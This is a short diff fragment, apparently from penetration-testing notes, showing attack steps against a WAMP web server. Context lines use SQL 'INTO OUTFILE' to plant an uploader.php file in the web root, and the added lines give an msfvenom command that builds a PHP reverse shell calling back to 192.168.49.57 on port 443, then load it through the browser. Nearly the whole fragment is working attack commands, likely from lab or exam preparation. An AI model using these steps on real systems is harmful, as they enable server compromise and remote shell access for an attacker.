@@ -21,3 +21,7 @@ SELECT
 INTO OUTFILE 'C:/wamp/www/uploader.php';
 ```
 Then access http://ip:port/uploader.php
+```
+msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
+access http://ip:port/shell.php
+```
